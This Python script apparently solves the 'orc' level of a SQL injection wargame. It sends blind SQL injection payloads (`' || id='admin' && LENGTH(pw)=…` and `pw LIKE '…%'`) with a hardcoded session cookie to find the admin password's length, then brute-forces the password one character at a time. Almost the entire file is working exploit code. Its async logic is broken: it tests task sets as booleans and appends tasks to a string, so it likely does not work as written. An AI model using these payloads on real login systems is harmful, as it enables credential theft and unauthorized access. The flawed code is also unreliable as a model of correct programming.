import requests
import asyncio


url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php"


def get_pw_length(cookie):
    cookie_header = {"PHPSESSID": cookie}

    for i in range(1, 20):
        query = "?pw=' || id='admin' %26%26 LENGTH(pw)={} %23".format(str(i))
        request = url + query

        response = requests.get(request, cookies=cookie_header)
        if response.text.find("<h2>Hello admin</h2>") > 0:
            print(i)
            return i


async def injection(cookie, length):
    cookie_header = {"PHPSESSID": cookie}
    result = ""

    char_list = "qwertyuiopasdfghjklzxcvbnmm1234567890QWERTYUIOPASDFGHJKLZXCVBNM"

    for i in range(length + 1):
        coroutines = [brute_forcing(cookie_header, url, result + x) for x in char_list]
        res = await asyncio.wait(coroutines)
        for x in res:
            if x is True:
                print(result)
                result += x
                break

            # response = requests.get(request, cookies=cookie_header)
            # if response.text.find("<h2>Hello admin</h2>") > 0:
            #     result += x
            #     print(result)
            #     break
            #
            # elif response.text.find("ORC") > 0:
            #     print(result)
            #     return result


async def brute_forcing(cookie, url, x):
    query = "?pw=0' || pw LIKE '" + x + "%' %23"
    request = url + query
    print(query)

    response = requests.get(request, cookies=cookie)
    if response.text.find("<h2>Hello admin</h2>") > 0:
        return True

    return False

if __name__ == '__main__':
    cookie = "jtspn2jog5bv2td16fr9ffksm3"
    length = get_pw_length(cookie)
    loop = asyncio.get_event_loop()
    loop.run_until_complete(injection(cookie, length))
    loop.close()
